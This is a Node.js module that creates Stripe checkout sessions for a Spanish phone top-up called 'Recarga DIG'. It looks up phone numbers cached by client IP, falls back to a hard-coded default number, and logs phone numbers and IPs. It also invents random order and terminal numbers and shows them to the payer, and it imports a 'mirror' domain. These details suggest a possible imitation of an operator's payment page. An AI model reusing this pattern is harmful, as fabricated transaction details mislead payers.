const { STRIPE_SECRET_KEY, MIRROR_DOMAIN } = require('./constants');
const storage = require('../db/storage');
const fetch = require('node-fetch');

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Try to get phone number from various sources
    if (!phoneNumber || !phoneNumber.match(/^\d{9}$/)) {
      if (clientIP) {
        console.log('Trying to get phone from cache for IP:', clientIP);
        const cachedPhone = await storage.getPhoneNumber(clientIP);
        if (cachedPhone && cachedPhone.match(/^\d{9}$/)) {
          console.log('Using cached phone:', cachedPhone);
          phoneNumber = cachedPhone;
        }
      }
    }

    // Default fallback phone number
    const defaultPhone = '624048596';
    
    // Ensure we have a valid phone, using default as last resort
    let validPhone = defaultPhone;
    if (phoneNumber && typeof phoneNumber === 'string') {
      // Extract only digits from the phone number
      const digits = phoneNumber.replace(/\D/g, '');
      if (digits.match(/^\d{9}$/)) {
        console.log('Using provided phone:', digits);
        validPhone = digits;
      }
    }
    
    // Double-check that validPhone is actually valid
    if (!validPhone || !validPhone.match(/^\d{9}$/)) {
      console.log('Using default phone number');
      validPhone = defaultPhone;
    }

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIG');
    params.append('line_items[0][price_data][product_data][description]', `*Número de teléfono*: ${validPhone}\n*Importe*: €${(priceInCents / 100).toFixed(2)}\n*Número de pedido*: ${orderNumber}\n*Número de terminal*: ${numberOfTerminal}`);

    console.log('Creating Stripe session with data:', {
      amount: priceInCents / 100,
      phoneNumber: validPhone,
      orderNumber: orderNumber,
      terminal: numberOfTerminal,
      clientIP: clientIP
    });

    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Stripe API error:', errorText);
      throw new Error(`Stripe API error: ${response.status} - ${errorText}`);
    }

    const session = await response.json();

    await storage.setPaymentData(session.id, {
      phoneNumber: validPhone,
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    });

    console.log('Stripe session created:', { sessionId: session.id, url: session.url });
    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

module.exports = {
  createStripeCheckoutSession
};